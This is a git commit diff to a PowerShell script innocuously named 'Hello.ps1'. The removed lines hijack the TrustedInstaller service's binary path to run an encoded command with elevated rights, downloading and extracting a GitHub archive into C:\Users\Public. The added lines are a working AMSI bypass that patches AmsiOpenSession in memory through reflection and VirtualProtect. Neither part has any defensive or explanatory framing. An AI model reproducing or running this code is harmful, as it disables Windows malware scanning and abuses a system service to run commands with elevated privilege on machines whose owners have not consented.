565ae7367c340bdb8ceb6880668c2beaa8e8c246
Angel Gabriel Gil Rojas <ing.angel.gabriel.gil.rojas@gmail.com>
2025-09-30 09:44:24 -0700

    Update Hello.ps1

--- Hello.ps1
+++ Hello.ps1
@@ -1,23 +1,43 @@
-function Run-Trusted([String]$command) {
-  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
-  $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
-  $DefaultBinPath = $service.PathName
-  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-  $base64Command = [Convert]::ToBase64String($bytes)
-  sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
-  sc.exe start TrustedInstaller | Out-Null
-  sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
-  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+     Equals('System.dll')
+     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+@($moduleName)), $functionName))
 }
 
-$downloadCommand = @"
-New-Item -Path 'C:\Users\Public' -ItemType Directory -Force
-Set-Location 'C:\Users\Public'
-Invoke-WebRequest -Uri 'https://github.com/Angel-Rojas-ING/Guia-Avanzada-de-Evil-Twins/archive/refs/heads/main.zip' -OutFile 'EvilTwins.zip' -ErrorAction Stop
-Expand-Archive 'EvilTwins.zip' -DestinationPath 'C:\Users\Public' -Force
-Remove-Item 'EvilTwins.zip' -Force
-"@
 
-Write-Host 'Downloading Evil Twins Guide to C:\Users\Public...'
-Run-Trusted -command $downloadCommand
-Write-Host 'Download completed!'
+function getDelegateType {
+    Param (
+     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
+     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
+    AutoClass', [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+[System.Reflection.CallingConventions]::Standard, $func).
+     SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
+$func). SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48,0x31,0xc9)  # Opcode for xor rcx, rcx;
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
